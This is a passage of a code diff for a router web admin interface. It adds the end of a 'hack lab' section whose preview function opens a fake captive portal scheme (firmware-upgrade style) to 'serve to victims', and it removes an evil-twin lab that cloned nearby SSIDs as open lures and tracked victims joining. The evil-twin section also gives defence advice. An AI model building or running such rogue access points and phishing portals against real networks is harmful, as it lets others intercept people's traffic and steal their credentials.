+      `<table><thead><tr><th>MAC</th><th>Name</th><th>Vendor</th></tr></thead><tbody>` +
+      devs.map(v => `<tr><td>${esc(v[0])}</td><td>${esc(v[2] || '?')}</td><td>${esc(v[3])}</td></tr>`).join('') + '</tbody></table>'
+      : '<p class="note">No BLE devices seen (adapter ' + (d.ok ? 'on' : 'missing') + ').</p>';
+  } else labSay('labmsg', esc(d.message || ''), d.ok);
+}
+function labPreviewPortal() {
+  const scheme = (window._labTarget && $('lb-portal')) ? $('lb-portal').value : 'fwupgrade';
+  const port = window._labPortalPort || 8080;
+  const host = location.hostname || window._labHostIp || '127.0.0.1';
+  window.open(`http://${host}:${port}/?preview=${scheme}`, 'preview');
+  labSay('labmsg', `Preview opened with scheme "${scheme}" — switch schemes and relaunch to serve it to victims.`, true);
+}
+/* ====== END HACK LAB ====== */
+
 const ALG_KEYS = [['ftpAlgEnable', 'FTP'], ['pptpAlgEnable', 'PPTP'], ['rtspAlgEnable', 'RTSP'], ['sipAlgEnable', 'SIP'], ['ipsecAlgEnable', 'IPsec'], ['h323AlgEnable', 'H.323']];
 async function secExtras() {
   const a = await get('/api/block?id=17');
@@ -1272,124 +1370,6 @@ async function saveDmz() {
   say('dmsg', d.ok ? 'DMZ updated.' : 'Failed: ' + JSON.stringify(d), d.ok);
 }
 
-async function tabTwin() {
-  const me = await get('/api/block?id=33');
-  window._twinOwn = me.ok ? {ssid: me.block.cSsid, key: me.block.cPskSecret, sec: me.block.bSecurityEnable} : {};
-  $('tabbody').innerHTML =
-    `<div class="card"><h3>📚 How an evil twin works</h3>
-      <div class="step"><div class="step-num">1</div><div class="step-body">
-        <b>Scan</b> — the attacker sniffs nearby WiFi, noting your SSID, channel and encryption.
-        Every AP shouts <b>beacon frames</b> (~10×/second) with its name, MAC, rates and crypto — all <b>in the clear</b>.</div></div>
-      <div class="step"><div class="step-num">2</div><div class="step-body">
-        <b>Clone</b> — the attacker creates an AP with <b>your exact SSID</b> on the same channel.
-        Nothing in WiFi stops anyone broadcasting your name — SSID is just a label, not an identity.</div></div>
-      <div class="step"><div class="step-num">3</div><div class="step-body">
-        <b>Lure</b> — with stronger signal or closer position, victim devices see two APs with one name
-        and join the <b>louder</b> one — the twin. Auto-reconnect makes this silent.</div></div>
-      <div class="step"><div class="step-num">4</div><div class="step-body">
-        <b>Intercept</b> — all victim traffic now flows through the attacker. On open networks passwords fly
-        in cleartext; on WPA2 the handshake can be recorded for offline cracking.
-        <b>This lab runs steps 1–3 for real against your own gear — broadcast, relay, live joins.
-        It never captures a password: this firmware has no sniffer, no proxy page, no such verbs.</b></div></div>
-      <p class="note">Lab scope: your own network/devices, or written permission. Victims ride YOUR internet via NAT (or an isolated lab with no internet).</p></div>
-    <div class="card"><h3>🎯 Step 1 — pick target <span id="twinpill"></span></h3>
-      <div class="btnrow"><button onclick="twinSurvey()">📡 Scan airwaves</button>
-      <button onclick="twinDetect()">🔍 Detect twins hunting me</button></div>
-      <div id="twinlist"><p class="note">Scan first.</p></div></div>
-    <div class="card"><h3>📡 Step 2 — twin console</h3><div id="twinconsole"><p class="note">Select a target above.</p></div><div class="msg" id="twinmsg"></div></div>
-    <div class="card"><h3>👥 Step 3 — victims (live joins)</h3><div id="twinvictims"><p class="note">No twin running.</p></div></div>
-    <div class="card"><h3>📊 WiFi forensic map</h3><div id="twinmap">Scan to generate.</div></div>
-    <div class="card"><h3>🛡️ How to defend against evil twins</h3>
-      ${row('1. Look at BSSID, not SSID', 'Your AP MAC never changes; a twin has a different MAC. Compare in the scan table.')}
-      ${row('2. Beware the OPEN copy', 'Same name seen open AND secured = textbook twin. Join only the secured one you recognize.')}
-      ${row('3. Turn off auto-join', 'Phones silently join the loudest known name — the twin counts on this.')}
-      ${row('4. HTTPS always', 'A twin sees encrypted blobs only when the site uses TLS. Never log in over plain HTTP.')}
-      ${row('5. Use a VPN on strange WiFi', 'An encrypted tunnel blinds packet inspection even on a twin.')}
-      ${row('6. Forget hotel/cafe nets', 'Delete them after the trip so they cannot be impersonated later.')}
-      ${row('7. WPA-Enterprise / certs', 'Per-user certificates make impersonation impossible without the CA.')}</div>`;
-  twinOrphan();
-  twinConsole();
-}
-async function twinOrphan() {
-  // Page reloaded mid-lab? Router may still broadcast the twin. Reconcile.
-  let snap = null;
-  try { snap = JSON.parse(localStorage.getItem('twinSnap') || 'null'); } catch (e) {}
-  if (!snap) return;
-  try {
-    const cur = await get('/api/block?id=33');
-    const curSsid = cur.ok ? cur.block.cSsid : '';
-    if (curSsid === snap.twinSsid) {
-      window._twinLive = {ssid: snap.twinSsid, sec: snap.twinSec, relay: snap.relay, channel: snap.twinCh, since: snap.ts, seen: new Set(), joins: [], orphan: true};
-      const base = await twinMacs();
-      window._twinLive.seen = base;
-      twinPollStart();
-      say('twinmsg', '⚠️ Page was reloaded mid-lab — twin is STILL LIVE on the router. STOP to restore (WiFi key must be retyped in 📶 WiFi if security was on).', false);
-    } else { try { localStorage.removeItem('twinSnap'); } catch (e) {} }
-  } catch (e) {}
-}
-async function twinConsole() {
-  const box = $('twinconsole');
-  if (!box) return;
-  const live = window._twinLive;
-  const pill = $('twinpill');
-  if (live) {
-    if (pill) pill.innerHTML = `<span class="bad">● LIVE — ${live.joins.length} joined</span>`;
-    const since = new Date(live.since).toLocaleTimeString();
-    box.innerHTML =
-      row('Broadcasting', live.ssid) +
-      row('Security', live.sec === '1' ? 'WPA2' : 'OPEN') +
-      row('Channel', live.channel || 'auto') +
-      row('Relay', live.relay === 'wds' ? 'WDS attempt + NAT fallback' : live.relay === 'off' ? 'isolated (no internet)' : 'your internet via NAT') +
-      row('Since', since) +
-      `<div class="btnrow"><button onclick="twinStop()" style="background:#9e6a03">■ STOP twin + restore my network</button></div>
-       <p class="note">While live, your original SSID does not exist — every wireless join IS a twin join. Your own devices: join the twin to feel the lesson, or wait it out on mobile data.</p>`;
-    return;
-  }
-  if (pill) pill.innerHTML = '<span class="ok">● OFF</span>';
-  const t = window._twinTarget;
-  if (!t || !t.ssid) { box.innerHTML = '<p class="note">Select a target above — the console builds itself.</p>'; return; }
-  let d1 = '0.0.0.0', d2 = '0.0.0.0';
-  try {
-    const b8 = await get('/api/block?id=8');
-    if (b8.ok) { d1 = (b8.block.dns || [])[0] || '0.0.0.0'; d2 = (b8.block.dns || [])[1] || '0.0.0.0'; }
-  } catch (e) {}
-  if (!$('twinconsole')) return;
-  const secured = String(t.auth) !== '0';
-  box.innerHTML =
-    `<h3 style="font-size:13px;color:#8b949e;margin:10px 0">🔬 Target: "${esc(t.ssid)}" (${esc(t.bssid)}, ch ${esc(t.channel)}, ${secured ? 'secured' : 'OPEN'})</h3>
-     <div class="kv"><label>Twin SSID</label><input id="tw-ssid" maxlength="32" value="${esc(t.ssid)}"></div>
-     <div class="kv"><label>Security</label><select id="tw-sec"><option value="0"${secured ? ' selected' : ''}>Open — classic lure (recommended vs secured targets)</option><option value="1"${!secured ? '' : ''}>WPA2 + key below</option></select></div>
-     <div class="kv"><label>Twin WPA2 key</label><input id="tw-key" type="password" placeholder="8–63 chars, only for WPA2 twin"></div>
-     <div class="kv"><label>Match channel ${esc(t.channel)}</label><select id="tw-ch"><option value="1">Yes — real twins sit on the same channel</option><option value="0">No — keep my channel</option></select></div>
-     <div class="kv"><label>Victim internet</label><select id="tw-relay"><option value="nat">Via my router internet (NAT — victims really browse)</option><option value="wds">Try WDS relay to target (needs its real key)</option><option value="off">Isolated — joinable, no internet</option></select></div>
-     <div class="kv"><label>Upstream key (WDS only)</label><input id="tw-upkey" type="password" placeholder="target's real key — your own net only"></div>
-     <div class="kv"><label>DNS for victims</label><span><input id="tw-d1" style="width:48%" value="${esc(d1)}"> <input id="tw-d2" style="width:48%" value="${esc(d2)}"></span></div>
-     <div class="btnrow"><button onclick="twinStart()">🔴 START twin (broadcast for real)</button></div>
-     <p class="note">Honest mechanics: vs a <b>secured</b> target, an OPEN clone is what lures (devices don't auto-join unknown secured nets). A WPA2 twin only catches devices if its key equals the real one — i.e. your own network. DHCP stays ON so victims get IP + DNS from you.</p>`;
-}
-function twinStatsRender(aps) {
-  const box = $('twinmap');
-  if (!box) return;
-  const authNames = {'0': 'Open', '1': 'WEP', '2': 'WPA TKIP', '3': 'WPA CCMP', '4': 'WPA2 TKIP', '5': 'WPA2 CCMP'};
-  const chMap = {}, encMap = {};
-  aps.forEach(a => {
-    const ch = String(a.channel), au = String(a.auth);
-    chMap[ch] = (chMap[ch] || 0) + 1;
-    encMap[au] = (encMap[au] || 0) + 1;
-  });
-  const channels = Object.keys(chMap).sort((a, b) => parseInt(a) - parseInt(b));
-  const encs = Object.entries(encMap).map(([k, v]) => `${authNames[k] || ('auth ' + k)}: ${v}`).join(', ');
-  const top = [...aps].sort((a, b) => (parseInt(b.rssi) || -999) - (parseInt(a.rssi) || -999)).slice(0, 5);
-  box.innerHTML =
-    row('Networks in range', String(aps.length)) +
-    row('Channels used', channels.join(', ') || 'none') +
-    row('Encryption mix', encs || 'none') +
-    `<p class="note" style="text-align:left"><b>Channel read:</b> ${channels.length > 1 ?
-      'traffic spread over several channels. If YOUR ssid shows up on a channel your router is not set to (see 📶 WiFi tab), that copy is not yours.' :
-      'single channel in use — any same-name AP on another channel would stand out immediately.'}</p>
-     <p class="note" style="text-align:left"><b>Strongest signals:</b><br>${top.map(a => `${esc(a.ssid) || '(hidden)'} @ ${esc(a.bssid)} — ${esc(a.rssi)} dBm, ch ${esc(a.channel)} (${authNames[String(a.auth)] || esc(a.auth)})`).join('<br>')}</p>
-     <p class="note" style="text-align:left"><b>Forensic rule:</b> a twin = <b>same SSID, different BSSID</b>. The scan table above is the evidence — sort suspects by asking which MAC is not your router's (📊 Status shows yours).</p>`;
-}
 async function tabTools() {
   $('tabbody').innerHTML =
     `<div class="card"><h3>🔧 Ping / Traceroute (runs ON the router)</h3>
